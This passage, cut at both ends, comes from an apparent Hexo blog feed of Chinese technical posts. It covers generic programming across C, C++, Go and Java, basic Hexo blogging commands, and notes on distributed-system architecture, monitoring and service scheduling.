来做临时的空间存储。</li></ul><p>于是，新增的<code>size</code>参数，使用的<code>memcpy</code>内存拷贝以及一个 buffer，这增加了编程的复杂度。这就是 C 语言的类型抽象所带来的复杂度的提升。</p><p>在提升复杂度的同时，我们发现还有问题，比如，我们想交换两个字符串数组，类型是：<code>char*</code>，那么，我的<code>swap()</code>函数的<code>x</code>和<code>y</code>参数是不是要用<code>void**</code>了？这样一来，接口就没法定义了。</p><p>除了使用 <code>void*</code> 来做泛型，在 C 语言中，还可以用宏定义来做泛型，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> swap(x, y, size) &#123;\</span><br><span class="hljs-meta">char temp[size]; \</span><br><span class="hljs-meta">memcpy(temp, &amp;y, size); \</span><br><span class="hljs-meta">memcpy(&amp;y,   &amp;x, size); \</span><br><span class="hljs-meta">memcpy(&amp;x, temp, size); \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure><p>但用宏带来的问题就是编译器做字符串替换，因为宏是做字符串替换，所以会导致代码膨胀，导致编译出的执行文件比较大。不过对于 swap 这个简单的函数来说，用<code>void*</code>和宏替换来说都可以达到泛型。</p><p>但是，如果我们不是 swap，而是 min() 或 max() 函数，那么宏替换的问题就会暴露得更多一些。比如，对于下面的这个宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(x, y)  （(x)&gt;(y) ? (y) : (x)）</span><br></code></pre></td></tr></table></figure><p>其中一个最大的问题，就是有可能会有<strong>重复执行</strong>的问题。</p><h3 id="C-泛型编程"><a href="#C-泛型编程" class="headerlink" title="C++ 泛型编程"></a>C++ 泛型编程</h3><p>C++ 泛型版的代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">typename</span> Iter&gt;</span><br><span class="hljs-function">Iter <span class="hljs-title">search</span><span class="hljs-params">(Iter pStart, Iter pEnd, T target)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span>(Iter p = pStart; p != pEnd; p++) &#123;<br><span class="hljs-keyword">if</span> ( *p == target ) <br><span class="hljs-keyword">return</span> p;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 C++ 的泛型版本中，我们可以看到：</p><ul><li>使用<code>typename T</code>抽象了数据结构中存储数据的类型。</li><li>使用<code>typename Iter</code>，这是不同的数据结构需要自己实现的“迭代器”，这样也就抽象掉了不同类型的数据结构。</li><li>然后，我们对数据容器的遍历使用了<code>Iter</code>中的<code>++</code>方法，这是数据容器需要重载的操作符，这样通过操作符重载也就泛型掉了遍历。</li><li>在函数的入参上使用了<code>pStart</code>和<code>pEnd</code>来表示遍历的起止。</li><li>使用<code>*Iter</code>来取得这个“指针”的内容。这也是通过重载 <code>*</code> 取值操作符来达到的泛型。</li></ul><h3 id="Go-泛型编程"><a href="#Go-泛型编程" class="headerlink" title="Go 泛型编程"></a>Go 泛型编程</h3><p>go1.18开始可以支持泛型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">find</span>[<span class="hljs-title">T</span> <span class="hljs-title">comparable</span>] <span class="hljs-params">(arr []T, elem T)</span></span> <span class="hljs-type">int</span> &#123;<br>  <span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> arr &#123;<br>    <span class="hljs-keyword">if</span>  v == elem &#123;<br>      <span class="hljs-keyword">return</span> i<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Go语言的泛型已基本可用了，只不过，还有三个问题：</p><ul><li>一个是 <code>fmt.Printf()</code>中的泛型类型是 <code>%v</code> 还不够好，不能像c++ <code>iostream</code>重载 <code>&gt;&gt;</code> 来获得程序自定义的输出。</li><li>另外一个是，go不支持操作符重载，所以，你也很难在泛型算法中使用“泛型操作符”如：<code>==</code> 等</li><li>最后一个是，上面的 <code>find()</code> 算法依赖于“数组”，对于hash-table、tree、graph、link等数据结构还要重写。也就是说，没有一个像C++ STL那样的一个泛型迭代器（这其中的一部分工作当然也需要通过重载操作符（如：<code>++</code> 来实现）</li></ul><h3 id="Java泛型编程"><a href="#Java泛型编程" class="headerlink" title="Java泛型编程"></a>Java泛型编程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型</span><br><span class="hljs-comment">//在实例化泛型类时，必须指定T的具体类型</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Generic</span>&lt;T&gt;&#123; <br>    <span class="hljs-comment">//key这个成员变量的类型为T,T的类型由外部指定  </span><br>    <span class="hljs-keyword">private</span> T key;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Generic</span><span class="hljs-params">(T key)</span> &#123; <span class="hljs-comment">//泛型构造方法形参key的类型也为T，T的类型由外部指定</span><br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//泛型方法getKey的返回值类型为T，T的类型由外部指定</span><br>        <span class="hljs-keyword">return</span> key;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="类型系统"><a href="#类型系统" class="headerlink" title="类型系统"></a>类型系统</h3><p>在计算机科学中，类型系统用于定义如何将编程语言中的数值和表达式归类为许多不同的类型，以及如何操作这些类型，还有这些类型如何互相作用。类型可以确认一个值或者一组值具有特定的意义和目的。</p><p>一般来说，编程语言会有两种类型，一种是内建类型，如 int、float 和 char 等，一种是抽象类型，如 struct、class 和 function 等。抽象类型在程序运行中，可能不表示为值。类型系统在各种语言之间有非常大的不同，也许，最主要的差异存在于编译时期的语法，以及运行时期的操作实现方式。</p><p>编译器可能使用值的静态类型以最优化所需的存储区，并选取对数值运算时的最佳算法。例如，在许多 C 编译器中，“浮点数”数据类型是以 32 比特表示、与 IEEE 754 规格一致的单精度浮点数。因此，在数值运算上，C 应用了浮点数规范（浮点数加法、乘法等）。</p><p>类型的约束程度以及评估方法，影响了语言的类型。更进一步，编程语言可能就类型多态性部分，对每一个类型都对应了一个针对于这个类型的算法运算。类型理论研究类型系统，尽管实际的编程语言类型系统，起源于计算机架构的实际问题、编译器实现，以及语言设计。</p><p>程序语言的类型系统主要提供如下的功能。</p><ul><li><strong>程序语言的安全性</strong>。使用类型可以让编译器侦测一些代码的错误。例如：可以识别出一个错误无效的表达式。如：<code>“Hello, World” + 3</code>这样的不同数据类型间操作的问题。强类型语言提供更多的安全性，但是并不能保证绝对的安全。</li><li><strong>利于编译器的优化</strong>。 静态类型语言的类型声明，可以让编译器明确地知道程序员的意图。因此，编译器就可以利用这一信息做很多代码优化工作。例如：如果我们指定一个类型是 <code>int</code> ，那么编译就知道，这个类型会以 4 个字节的倍数进行对齐，编译器就可以非常有效地利用更有效率的机器指令。</li><li><strong>代码的可读性</strong>。有类型的编程语言，可以让代码更易读和更易维护。代码的语义也更清楚，代码模块的接口（如函数）也更丰富和清楚。</li><li><strong>抽象化</strong>。类型允许程序设计者对程序以较高层次的方式思考，而不是烦人的低层次实现。例如，我们使用整型或是浮点型来取代底层的字节实现，我们可以将字符串设计成一个值，而不是底层字节的数组。从高层上来说，类型可以用来定义不同模块间的交互协议，比如函数的入参类型和返回类型，从而可以让接口更有语义，而且不同的模块数据交换更为直观和易懂。</li></ul><p>但是，正如前面说的，<strong>类型带来的问题就是我们作用于不同类型的代码，虽然长得非常相似，但是由于类型的问题需要根据不同版本写出不同的算法，如果要做到泛型，就需要涉及比较底层的玩法</strong>。</p><h3 id="泛型的本质"><a href="#泛型的本质" class="headerlink" title="泛型的本质"></a>泛型的本质</h3><p>要了解泛型的本质，就需要了解类型的本质。</p><ul><li>类型是对内存的一种抽象。不同的类型，会有不同的内存布局和内存分配的策略。</li><li>不同的类型，有不同的操作。所以，对于特定的类型，也有特定的一组操作。</li></ul><p>所以，要做到泛型，我们需要做下面的事情。</p><ul><li>标准化掉类型的内存分配、释放和访问。</li><li>标准化掉类型的操作。比如：比较操作，I&#x2F;O 操作，复制操作……</li><li>标准化掉数据容器的操作。比如：查找算法、过滤算法、聚合算法……</li><li>标准化掉类型上特有的操作。需要有标准化的接口来回调不同类型的具体操作……</li></ul><p>所以，C++ 动用了非常繁多和复杂的技术来达到泛型编程的目标。</p><ul><li>通过类中的构造、析构、拷贝构造，重载赋值操作符，标准化（隐藏）了类型的内存分配、释放和复制的操作。</li><li>通过重载操作符，可以标准化类型的比较等操作。</li><li>通过 iostream，标准化了类型的输入输出控制。</li><li>通过模板技术（包括模板的特化），来为不同的类型生成类型专属的代码。</li><li>通过迭代器来标准化数据容器的遍历操作。</li><li>通过面向对象的接口依赖（虚函数技术），来标准化了特定类型在特定算法上的操作。</li><li>通过函数式（函数对象），来标准化对于不同类型的特定操作。</li></ul><p>我理解其本质就是 —— <strong>屏蔽掉数据和操作数据的细节，让算法更为通用，让编程者更多地关注算法的结构，而不是在算法中处理不同的数据类型。</strong></p>]]></content>
    
    
    <categories>
      
      <category>编程范式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>左耳听风</tag>
      
      <tag>编程范式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo常用操作以及注意事项</title>
    <link href="/2022/09/03/hexo%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
    <url>/2022/09/03/hexo%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">## 新建文章<blockquote><p>命令：<code>hexo new [layout] title</code>或 <code>hexo n [layout] title</code></p></blockquote><p>创建文章前要先选定模板，在hexo中也叫做布局。hexo支持三种布局（layout）：post(默认)、draft、page。我们先介绍如何使用已有布局，后面还将会介绍如何自定义布局。</p><p>在博客目录下输入以下命令时，会默认使用post布局，然后自动在<code>source\_posts</code>目录生成一个text1.md文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo n text1<br></code></pre></td></tr></table></figure><p>当然你还可以指定布局：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo n [layout_name] draft1<br></code></pre></td></tr></table></figure><p>该命令创建了一个使用特定布局的名为draft1的文章。</p><p>打开之前创建的text1.md文件，我们可以看到文章开头包含以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">text1</span><br><span class="hljs-attr">author:</span> <span class="hljs-string">longpi1</span><br><span class="hljs-attr">tags:</span> <span class="hljs-string">hexo</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">blog</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>上面的内容在hexo被称作<strong>Front-matter，实际上就是该文章的一些变量，用于实现一些特定的功能</strong>。比如使<code>author: longpi1</code>，那么渲染后的文章中将显示文章作者为<code>longpi1</code>。</p><h2 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h2><p>启动hexo本地服务器<code>hexo server</code> 或 <code>hexo s</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">$ hexo s INFO  Start processingINFO  Hexo is running <span class="hljs-keyword">at</span> <span class="hljs-keyword">http</span>://localhost:<span class="hljs-number">4000</span>/. Press Ctrl+C <span class="hljs-built_in">to</span> <span class="hljs-built_in">stop</span>.<br></code></pre></td></tr></table></figure><p>在浏览器输入 <a href="http://localhost:4000/">http://localhost:4000/</a> 进行预览，回到Git Bash输入<code>Ctrl+C</code>关闭本地服务器退出预览。</p><p>指定端口：<br><code>hexo s -p 8080</code></p><p>自定义 IP<br>服务器默认运行在 0.0.0.0，您可以覆盖默认的 IP 设置，如下：<br><code>hexo server -i 192.168.1.1</code></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p><code>hexo d</code> 或 <code>hexo deploy</code><br><code>hexo d -g</code> 部署之前预先生成静态文件</p><h3 id="关于部署后原来的CNAME文件被覆盖的问题"><a href="#关于部署后原来的CNAME文件被覆盖的问题" class="headerlink" title="关于部署后原来的CNAME文件被覆盖的问题"></a>关于部署后原来的CNAME文件被覆盖的问题</h3><p>解决：CNAME,README,404.html都可以放在Hexo&#x2F;source文件夹下，<code>hexo g</code>生成博客时会被原封不动的拷贝到public文件夹中，部署后自然就到了项目的根目录。</p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分布式系统笔记</title>
    <link href="/2022/08/28/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/08/28/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="传统单体架构和分布式服务化架构的区别"><a href="#传统单体架构和分布式服务化架构的区别" class="headerlink" title="传统单体架构和分布式服务化架构的区别"></a>传统单体架构和分布式服务化架构的区别</h2><p><img src="https://static001.geekbang.org/resource/image/8f/91/8fecccec610626a3e348318b1fd17791.png?wh=1084*724" alt="img"></p><p><strong>存在的问题：</strong></p><ul><li>架构设计变得复杂（尤其是其中的分布式事务）。</li><li>部署单个服务会比较快，但是如果一次部署需要多个服务，流程会变得复杂。</li><li>系统的吞吐量会变大，但是响应时间会变长。</li><li>运维复杂度会因为服务变多而变得很复杂。</li><li>架构复杂导致学习曲线变大。</li><li>测试和查错的复杂度增大。</li><li>技术多元化，这会带来维护和运维的复杂度。</li><li>管理分布式系统中的服务和调度变得困难和复杂。</li></ul><h2 id="分布式系统的目的以及相关技术"><a href="#分布式系统的目的以及相关技术" class="headerlink" title="分布式系统的目的以及相关技术"></a>分布式系统的目的以及相关技术</h2><p><strong>构建分布式系统的目的是增加系统容量，提高系统的可用性，转换成技术方面，也就是完成下面两件事。</strong></p><ul><li><strong>大流量处理。</strong>通过集群技术把大规模并发请求的负载分散到不同的机器上。</li><li><strong>关键业务保护。</strong>提高后台服务的可用性，把故障隔离起来阻止多米诺骨牌效应（雪崩效应）。如果流量过大，需要对业务降级，以保护关键业务流转。</li></ul><h3 id="提高架构的性能"><a href="#提高架构的性能" class="headerlink" title="提高架构的性能"></a>提高架构的性能</h3><p><img src="https://static001.geekbang.org/resource/image/a9/17/a9edeae125a80f381003d8d9d0056317.png?wh=863*321" alt="img"></p><ul><li><strong>缓存系统。</strong>加入缓存系统，可以有效地提高系统的访问能力。从前端的浏览器，到网络，再到后端的服务，底层的数据库、文件系统、硬盘和 CPU，全都有缓存，这是提高快速访问能力最有效的手段。对于分布式系统下的缓存系统，需要的是一个缓存集群。这其中需要一个 Proxy 来做缓存的分片和路由。</li><li><strong>负载均衡系统。</strong>负载均衡系统是水平扩展的关键技术，它可以使用多台机器来共同分担一部分流量请求。</li><li><strong>异步调用。</strong>异步系统主要通过消息队列来对请求做排队处理，这样可以把前端的请求的峰值给“削平”了，而后端通过自己能够处理的速度来处理请求。这样可以增加系统的吞吐量，但是实时性就差很多了。同时，还会引入消息丢失的问题，所以要对消息做持久化，这会造成“有状态”的结点，从而增加了服务调度的难度。</li><li><strong>数据分区和数据镜像。数据分区</strong>是把数据按一定的方式分成多个区（比如通过地理位置），不同的数据区来分担不同区的流量。这需要一个数据路由的中间件，会导致跨库的 Join 和跨库的事务非常复杂。而<strong>数据镜像</strong>是把一个数据库镜像成多份一样的数据，这样就不需要数据路由的中间件了。你可以在任意结点上进行读写，内部会自行同步数据。然而，数据镜像中最大的问题就是数据的一致性问题。</li></ul><h3 id="提高架构的稳定性"><a href="#提高架构的稳定性" class="headerlink" title="提高架构的稳定性"></a>提高架构的稳定性</h3><p><img src="https://static001.geekbang.org/resource/image/be/79/befd21e1b41a257c5028f8c1bc7fa279.png?wh=865*315" alt="img"></p><ul><li><strong>服务拆分。</strong>服务拆分主要有两个目的：一是为了隔离故障，二是为了重用服务模块。但服务拆分完之后，会引入服务调用间的依赖问题。</li><li><strong>服务冗余。</strong>服务冗余是为了去除单点故障，并可以支持服务的弹性伸缩，以及故障迁移。然而，对于一些有状态的服务来说，冗余这些有状态的服务带来了更高的复杂性。其中一个是弹性伸缩时，需要考虑数据的复制或是重新分片，迁移的时候还要迁移数据到其它机器上。</li><li><strong>限流降级。</strong>当系统实在扛不住压力时，只能通过限流或者功能降级的方式来停掉一部分服务，或是拒绝一部分用户，以确保整个架构不会挂掉。这些技术属于保护措施。</li><li><strong>高可用架构。</strong>通常来说高可用架构是从冗余架构的角度来保障可用性。比如，多租户隔离，灾备多活，或是数据可以在其中复制保持一致性的集群。总之，就是为了不出单点故障。</li><li><strong>高可用运维。</strong>高可用运维指的是 DevOps 中的 CI&#x2F;CD（持续集成 &#x2F; 持续部署）。一个良好的运维应该是一条很流畅的软件发布管线，其中做了足够的自动化测试，还可以做相应的灰度发布，以及对线上系统的自动化控制。这样，可以做到“计划内”或是“非计划内”的宕机事件的时长最短。</li></ul><h3 id="分布式系统的关键技术"><a href="#分布式系统的关键技术" class="headerlink" title="分布式系统的关键技术"></a>分布式系统的关键技术</h3><ul><li><strong>服务治理。</strong>服务拆分、服务调用、服务发现、服务依赖、服务的关键度定义……服务治理的最大意义是需要把服务间的依赖关系、服务调用链，以及关键的服务给梳理出来，并对这些服务进行性能和可用性方面的管理。</li><li><strong>架构软件管理。</strong>服务之间有依赖，而且有兼容性问题，所以，整体服务所形成的架构需要有架构版本管理、整体架构的生命周期管理，以及对服务的编排、聚合、事务处理等服务调度功能。</li><li><strong>DevOps。</strong>分布式系统可以更为快速地更新服务，但是对于服务的测试和部署都会是挑战。所以，还需要 DevOps 的全流程，其中包括环境构建、持续集成、持续部署等。</li><li><strong>自动化运维。</strong>有了 DevOps 后，我们就可以对服务进行自动伸缩、故障迁移、配置管理、状态管理等一系列的自动化运维技术了。</li><li><strong>资源调度管理。</strong>应用层的自动化运维需要基础层的调度支持，也就是云计算 IaaS 层的计算、存储、网络等资源调度、隔离和管理。</li><li><strong>整体架构监控。</strong>如果没有一个好的监控系统，那么自动化运维和资源调度管理只可能成为一个泡影，因为监控系统是你的眼睛。没有眼睛，没有数据，就无法进行高效运维。所以说，监控是非常重要的部分。这里的监控需要对三层系统（应用层、中间件层、基础层）进行监控。</li><li><strong>流量控制</strong>。最后是我们的流量控制，负载均衡、服务路由、熔断、降级、限流等和流量相关的调度都会在这里，包括灰度发布之类的功能也在这里。</li></ul><p><img src="https://static001.geekbang.org/resource/image/8e/db/8e92e2dff4f66147c014f930aa678fdb.jpg?wh=2556x1006" alt="img"></p><h3 id="全栈监控"><a href="#全栈监控" class="headerlink" title="全栈监控"></a>全栈监控</h3><p><strong>全栈监控，其实就是三层监控。</strong></p><ul><li><strong>基础层：</strong>监控主机和底层资源。比如：CPU、内存、网络吞吐、硬盘 I&#x2F;O、硬盘使用等。</li><li><strong>中间层：</strong>就是中间件层的监控。比如：Nginx、Redis、ActiveMQ、Kafka、MySQL、Tomcat 等。应用层：</li><li><strong>监控应用层的使用</strong>。比如：HTTP 访问的吞吐量、响应时间、返回码、调用链路分析、性能瓶颈，还包括用户端的监控。</li></ul><p><img src="https://static001.geekbang.org/resource/image/fe/4f/fe3aaf79df1565505cdac32494078a4f.jpg?wh=2145x1152" alt="img"></p><h4 id="什么才是好的监控系统"><a href="#什么才是好的监控系统" class="headerlink" title="什么才是好的监控系统"></a>什么才是好的监控系统</h4><p><strong>监控系统可能存在的问题：</strong></p><p>1.<strong>监控数据是隔离开来的。</strong>因为公司分工的问题，开发、应用运维、系统运维，各管各的，所以很多公司的监控系统之间都有一道墙，完全串不起来。</p><p><strong>2.监控的数据项太多。</strong>有些公司的运维团队把监控的数据项多作为一个亮点到处讲，比如监控指标达到 5 万多个。老实说，这太丢人了。因为信息太多等于没有信息，抓不住重点的监控才会做成这个样子，完全就是使蛮力的做法。</p><p><strong>好的监控系统有以下几个特征：</strong></p><ol><li><strong>关注于整体应用的 SLA（服务级别协议）。</strong>主要从为用户服务的 API 来监控整个系统。</li><li><strong>关联指标聚合。</strong>把有关联的系统及其指标聚合展示。主要是三层系统数据：基础层、平台中间件层和应用层。其中，最重要的是把服务和相关的中间件以及主机关联在一起，服务有可能运行在 Docker 中，也有可能运行在微服务平台上的多个 JVM 中，也有可能运行在 Tomcat 中。总之，无论运行在哪里，我们都需要把服务的具体实例和主机关联在一起，否则，对于一个分布式系统来说，定位问题犹如大海捞针。</li><li><strong>快速故障定位。</strong>对于现有的系统来说，故障总是会发生的，而且还会频繁发生。故障发生不可怕，可怕的是故障的恢复时间过长。所以，快速地定位故障就相当关键。快速定位问题需要对整个分布式系统做一个用户请求跟踪的 trace 监控，我们需要监控到所有的请求在分布式系统中的调用链，这个事最好是做成没有侵入性的。</li></ol><p><strong>以下两大主要功能实现</strong></p><h5 id="“体检”"><a href="#“体检”" class="headerlink" title="“体检”"></a>“体检”</h5><ul><li><strong>容量管理。</strong>提供一个全局的系统运行时数据的展示，可以让工程师团队知道是否需要增加机器或者其它资源。</li><li><strong>性能管理。</strong>可以通过查看大盘，找到系统瓶颈，并有针对性地优化系统和相应代码。</li></ul><h5 id="“急诊”"><a href="#“急诊”" class="headerlink" title="“急诊”"></a>“急诊”</h5><ul><li><strong>定位问题</strong>。可以快速地暴露并找到问题的发生点，帮助技术人员诊断问题。</li><li><strong>性能分析。</strong>当出现非预期的流量提升时，可以快速地找到系统的瓶颈，并帮助开发人员深入代码。</li></ul><p><strong>如何做出一个好的监控系统</strong></p><ul><li><strong>服务调用链跟踪。</strong>这个监控系统应该从对外的 API 开始，然后将后台的实际服务给关联起来，然后再进一步将这个服务的依赖服务关联起来，直到最后一个服务（如 MySQL 或 Redis），这样就可以把整个系统的服务全部都串连起来了。这个事情的最佳实践是 Google Dapper 系统，其对应于开源的实现是 Zipkin。对于 Java 类的服务，我们可以使用字节码技术进行字节码注入，做到代码无侵入式。</li><li><strong>服务调用时长分布。</strong>使用 Zipkin，可以看到一个服务调用链上的时间分布，这样有助于我们知道最耗时的服务是什么。下图是 Zipkin 的服务调用时间分布。</li><li><strong>服务的 TOP N 视图。</strong>所谓 TOP N 视图就是一个系统请求的排名情况。一般来说，这个排名会有三种排名的方法：a）按调用量排名，b) 按请求最耗时排名，c）按热点排名（一个时间段内的请求次数的响应时间和）。</li><li><strong>数据库操作关联。</strong>对于 Java 应用，我们可以很方便地通过 JavaAgent 字节码注入技术拿到 JDBC 执行数据库操作的执行时间。对此，我们可以和相关的请求对应起来。</li><li><strong>服务资源跟踪。</strong>我们的服务可能运行在物理机上，也可能运行在虚拟机里，还可能运行在一个 Docker 的容器里，Docker 容器又运行在物理机或是虚拟机上。我们需要把服务运行的机器节点上的数据（如 CPU、MEM、I&#x2F;O、DISK、NETWORK）关联起来。</li></ul><p><strong>了这些数据上的关联，我们就可以达到如下的目标。</strong></p><ol><li>当一台机器挂掉是因为 CPU 或 I&#x2F;O 过高的时候，我们马上可以知道其会影响到哪些对外服务的 API。</li><li>当一个服务响应过慢的时候，我们马上能关联出来是否在做 Java GC，或是其所在的计算结点上是否有资源不足的情况，或是依赖的服务是否出现了问题。</li><li>当发现一个 SQL 操作过慢的时候，我们能马上知道其会影响哪个对外服务的 API。</li><li>当发现一个消息队列拥塞的时候，我们能马上知道其会影响哪些对外服务的 API。</li></ol><p><strong>一旦了解了这些信息，我们就可以做出调度。比如：</strong></p><ol><li>一旦发现某个服务过慢是因为 CPU 使用过多，我们就可以做弹性伸缩。</li><li>一旦发现某个服务过慢是因为 MySQL 出现了一个慢查询，我们就无法在应用层上做弹性伸缩，只能做流量限制，或是降级操作了。</li></ol><p><strong>实现效果如下图：</strong></p><p><img src="https://static001.geekbang.org/resource/image/6b/33/6b17dd779cfecd62e02924dc8618e833.png?wh=865*381" alt="img"></p><h3 id="服务调度"><a href="#服务调度" class="headerlink" title="服务调度"></a>服务调度</h3><p><strong>微服务是服务依赖最优解的上限，而服务依赖的下限是千万不要有依赖环。</strong>如果系统架构中有服务依赖环，那么表明你的架构设计是错误的。循环依赖有很多的副作用，最大的问题是这是一种极强的耦合，会导致服务部署相当复杂和难解，而且会导致无穷尽的递归故障和一些你意想不到的问题。</p><h4 id="服务状态和生命周期的管理"><a href="#服务状态和生命周期的管理" class="headerlink" title="服务状态和生命周期的管理"></a>服务状态和生命周期的管理</h4><p>服务的生命周期通常会有以下几个状态：</p><ul><li>Provision，代表在供应一个新的服务；</li><li>Ready，表示启动成功了；</li><li>Run，表示通过了服务健康检查；</li><li>Update，表示在升级中；</li><li>Rollback，表示在回滚中；</li><li>Scale，表示正在伸缩中（可以有 Scale-in 和 Scale-out 两种）；</li><li>Destroy，表示在销毁中；</li><li>Failed，表示失败状态。</li></ul><p>这几个状态需要管理好，不然的话，你将不知道这些服务在什么样的状态下。不知道在什么样的状态下，你对整个分布式架构也就无法控制了。</p><h4 id="整个架构的版本管理"><a href="#整个架构的版本管理" class="headerlink" title="整个架构的版本管理"></a>整个架构的版本管理</h4><p>需要一个架构的 manifest，一个服务清单，这个服务清单定义了所有服务的版本运行环境，其中包括但不限于：</p><ul><li>服务的软件版本；</li><li>服务的运行环境——环境变量、CPU、内存、可以运行的节点、文件系统等；</li><li>服务运行的最大最小实例数。</li></ul><h4 id="资源-x2F-服务调度"><a href="#资源-x2F-服务调度" class="headerlink" title="资源 &#x2F; 服务调度"></a>资源 &#x2F; 服务调度</h4><p>服务和资源的调度有点像操作系统。操作系统一方面把用户进程在硬件资源上进行调度，另一方面提供进程间的通信方式，可以让不同的进程在一起协同工作。服务和资源调度的过程，与操作系统调度进程的方式很相似，主要有以下一些关键技术。</p><ul><li>服务状态的维持和拟合。</li><li>服务的弹性伸缩和故障迁移。</li><li>作业和应用调度。</li><li>作业工作流编排。</li><li>服务编排。</li></ul><h4 id="服务状态的维持"><a href="#服务状态的维持" class="headerlink" title="服务状态的维持"></a>服务状态的维持</h4><p>所谓服务状态不是服务中的数据状态，而是服务的运行状态，换句话说就是服务的 Status，而不是 State。也就是上述服务运行时生命周期中的状态——Provision，Ready，Run，Scale，Rollback，Update，Destroy，Failed……服务运行时的状态是非常关键的。</p><p>服务运行过程中，状态也是会有变化的，这样的变化有两种。</p><ul><li>一种是没有预期的变化。比如，服务运行因为故障导致一些服务挂掉，或是别的什么原因出现了服务不健康的状态。而一个好的集群管理控制器应该能够强行维护服务的状态。在健康的实例数变少时，控制器会把不健康的服务给摘除，而又启动几个新的，强行维护健康的服务实例数。</li><li>另外一种是预期的变化。比如，我们需要发布新版本，需要伸缩，需要回滚。这时，集群管理控制器就应该把集群从现有状态迁移到另一个新的状态。这个过程并不是一蹴而就的，集群控制器需要一步一步地向集群发送若干控制命令。这个过程叫“拟合”——从一个状态拟合到另一个状态，而且要穷尽所有的可能，玩命地不断地拟合，直到达到目的。</li></ul><h4 id="服务的弹性伸缩和故障迁移"><a href="#服务的弹性伸缩和故障迁移" class="headerlink" 